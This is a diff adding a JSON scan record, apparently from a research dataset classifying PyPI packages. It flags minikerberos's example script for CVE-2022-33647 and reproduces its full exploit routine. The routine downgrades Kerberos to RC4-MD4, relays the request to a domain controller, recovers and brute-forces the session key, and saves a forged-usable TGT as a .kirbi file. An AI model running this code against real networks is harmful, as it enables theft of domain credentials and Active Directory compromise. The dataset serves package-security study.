@@ -1,0 +1,58 @@
+[
+  {
+    "metadata": {
+      "package_name": "minikerberos-0.4.4",
+      "total_matches": 1,
+      "processing_date": "2025-05-18 01:49:40"
+    }
+  },
+  {
+    "pyfile": "CVE_2022_33647.py",
+    "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_benign/minikerberos-0.4.4/minikerberos-0.4.4/minikerberos/examples/CVE_2022_33647.py",
+    "line_number": "277",
+    "type_description": "B815:write",
+    "severity": "High",
+    "confidence": "Medium",
+    "original_snippet": "276\t\t\t\t\t\twith open(filename, 'wb') as f:\n277\t\t\t\t\t\t\tf.write(kirbi)\n278\t\t\t\t\t\treturn",
+    "code_snippet": "async def handle_client(self, reader, writer):\n    dcwriter = None\n    try:\n        addr = writer.get_extra_info('peername')\n        saddr = '%s:%s' % (addr[0], addr[1])\n        print('[+] Client connected from %s' % (saddr))\n\n        ticketdata, ticket, ticketnative, err = await self.read_ticket(reader)\n        if err is not None:\n            raise err\n        if ticketnative['msg-type'] != 10:\n            print('[-] Not expected ticket arrived from client. Msg type: %s' % ticketnative['msg-type'])\n            return\n        \n        for padata in ticketnative['padata']:\n            if padata['padata-type'] == 2: #and padata[]:\n                ed = EncryptedData.load(padata['padata-value']).native\n                if ed['etype'] == -128:\n                    enc_timestamp = ed['cipher'][24:]\n                    break\n        #This is AS-REQ\n        else:\n            # not the expected encryption type, sending error message to client,\n            # informing it that we only support etype -128\n            print('[+] Downgrading Kerberos encryption to RC4_MD4')\n            now = datetime.datetime.now(datetime.timezone.utc)\n            realm = ticketnative['req-body']['realm']\n            pad1 = PA_DATA({\n                'padata-type' : PaDataType.ETYPE_INFO2.value,\n                'padata-value': ETYPE_INFO2([{'etype' : -128}]).dump()\n            })\n            pad2 = PA_DATA({\n                'padata-type' : 2,\n                'padata-value': b'',\n            })\n            pad3 = PA_DATA({\n                'padata-type' : 15,\n                'padata-value': b'',\n            })\n            pad4 = PA_DATA({\n                'padata-type' : 16,\n                'padata-value': b'',\n            })\n            md = [pad1, pad2, pad3, pad4]\n            \n            err = {\n                'pvno' : 5,\n                'msg-type': 30,\n                #'ctime': None\n                #'cusec': None,\n                'stime' : now.replace(microsecond=0),\n                'susec' : now.microsecond,\n                'error-code' : 25,\n                #'crealm' : None,\n                #'cname' : None,\n                'realm' : realm,\n                'sname' : PrincipalName({'name-type': 1, 'name-string': ['krbtgt', realm]}),# krbtgt name..,\n                #'e-text' : None,\n                'e-data': METHOD_DATA(md).dump()\n\n            }\n            ticketdata = KRB_ERROR(err).dump()\n\n            _, err = await self.send_ticket(writer, ticketdata)\n            if err is not None:\n                raise err\n            return\n        \n        print('[+] Connecting to DC at %s:%s' % (self.dc_ip, self.dc_port))\n        dcreader, dcwriter = await asyncio.open_connection(self.dc_ip, self.dc_port)\n        print('[+] Connected to DC!')\n        print('[+] Modifying original AS-REQ...')\n        ticketnative['req-body']['addresses'] = get_padding_data()\n        modded_ticket = AS_REQ(ticketnative).dump()\n        _, err = await self.send_ticket(dcwriter, modded_ticket)\n        if err is not None:\n            raise err\n        print('[+] Submitting original AS-REQ to DC')\n        rticketdata, rticket, rticketnative, err = await self.read_ticket(dcreader)\n        if err is not None:\n            raise err\n        print('[+] Got AS-REP with the correct enctype!')\n        cipher_data = rticketnative['enc-part']['cipher'][24:]\n        known_plaintext = calc_known_plaintext(rticketnative['enc-part']['cipher'][24:])\n        if len(known_plaintext) < 21:\n            print('[-] AS-REP cipher data too short! Will not work..')\n            return\n        print('[i] ENC TIMESTAMP: %s' % enc_timestamp.hex())\n        print('[i] AS-REP CIPHER: %s' % cipher_data.hex()[:0x40])\n        \n        \n        ts_bytes = enc_timestamp[len(known_plaintext):]\n        cipher_bytes = cipher_data[len(known_plaintext):]\n        keystream = byte_xor(ts_bytes, ts_len_hdr_lookup[len(enc_timestamp)])\n        dec_key = byte_xor(keystream, cipher_bytes)\n        print('[i] ENC BYTESTREAM   : %s' % ts_bytes.hex())\n        print('[i] CIP BYTESTREAM   : %s' % cipher_bytes.hex()[:0x40])\n        print('[i] KNOWN PLAINTEXT  : %s' % known_plaintext.hex())\n        print('[i] KEYSTREAM FROM TS: %s' % keystream.hex())\n        print('[i] DEC KEY - 4 BYTES: %s' % dec_key.hex())\n        print('[+] Guessing last bytes of the session key...')\n        target = KerberosTarget(self.dc_ip)\n        credential = KerberosCredential()\n        credential.username = ticketnative['req-body']['cname']['name-string'][0]\n        credential.domain = ticketnative['req-body']['realm']\n        credential.password = 'A'\n        client = AIOKerberosClient(credential, target)\n        client.kerberos_TGT = rticketnative\n        for i in range(256):\n            i = i.to_bytes(1, byteorder='big', signed=False)\n            keyguess = dec_key + i + b'\\xAB'*11\n            print('[i] GUESSING KEY: %s' % keyguess.hex())\n            \n            client.kerberos_TGT = rticketnative\n            client.kerberos_cipher = _enctype_table[-128]\n            client.kerberos_cipher_type = -128\n            client.kerberos_session_key = Key(-128, keyguess)\n            try:\n                await client.get_TGS(KerberosSPN.from_upn('krbtgt@test.corp'))\n            except Exception as e:\n                continue\n            else:\n                now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)\n                print('[+] GUESSED CORRECTLY! SESSIONKEY: %s' % keyguess.hex())\n                kirbi = tgt_to_kirbi(rticketnative, keyguess, now).dump()\n                print('[+] KIRBI DATA:')\n                print(format_kirbi(kirbi))\n                filename = '%s.kirbi' % (now.strftime(\"%Y%m%d_%H%M%S\"))\n                print('[+] Writing .kirbi file to: %s' % filename)\n                with open(filename, 'wb') as f:\n                    f.write(kirbi)\n                return\n\n    except Exception as e:\n        traceback.print_exc()\n        #return None, e\n    finally:\n        if dcwriter is not None:\n            dcwriter.close()\n        writer.close()",
+    "pattern_analysis": {
+      "api_sequence": [
+        "asyncio.open_connection",
+        "open",
+        "traceback.print_exc"
+      ],
+      "api_sequence_with_args": [
+        "asyncio.open_connection(self.dc_ip, self.dc_port)",
+        "open(filename, 'wb')",
+        "traceback.print_exc()"
+      ],
+      "mapped_sequence": [
+        {
+          "api_name": "asyncio.open_connection",
+          "id": "establish_tcp_connection",
+          "description": "Establishes TCP connection to specified address",
+          "first_id": "basic_network_operations",
+          "second_id": "socket_communication",
+          "third_id": "connection_management"
+        },
+        {
+          "api_name": "open",
+          "id": "basic_write_operations",
+          "description": "Basic file opening operations for writing (normal writing, binary writing)",
+          "first_id": "file_operations",
+          "second_id": "file_reading_writing",
+          "third_id": "file_opening"
+        },
+        {
+          "api_name": "traceback.print_exc",
+          "id": "log_error",
+          "description": "Logs error message",
+          "first_id": "data_exfiltration",
+          "second_id": "data_collection_operations",
+          "third_id": "data_acquisition"
+        }
+      ],
+      "contextual_code": "async def handle_client(self, reader, writer):\n    dcwriter = None\n    try:\n        # ...\n        print('[+] Connecting to DC at %s:%s' % (self.dc_ip, self.dc_port))\n        dcreader, dcwriter = await asyncio.open_connection(self.dc_ip, self.dc_port)\n        print('[+] Connected to DC!')\n        # ...\n        for i in range(256):\n            # ...\n            try:\n                await client.get_TGS(KerberosSPN.from_upn('krbtgt@test.corp'))\n            except Exception as e:\n                continue\n            else:\n                now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)\n                print('[+] GUESSED CORRECTLY! SESSIONKEY: %s' % keyguess.hex())\n                kirbi = tgt_to_kirbi(rticketnative, keyguess, now).dump()\n                print('[+] KIRBI DATA:')\n                print(format_kirbi(kirbi))\n                filename = '%s.kirbi' % (now.strftime(\"%Y%m%d_%H%M%S\"))\n                print('[+] Writing .kirbi file to: %s' % filename)\n                with open(filename, 'wb') as f:\n                    f.write(kirbi)\n                return\n    except Exception as e:\n        traceback.print_exc()\n    finally:\n        if dcwriter is not None:\n            dcwriter.close()\n        writer.close()"
+    }
+  }
+]
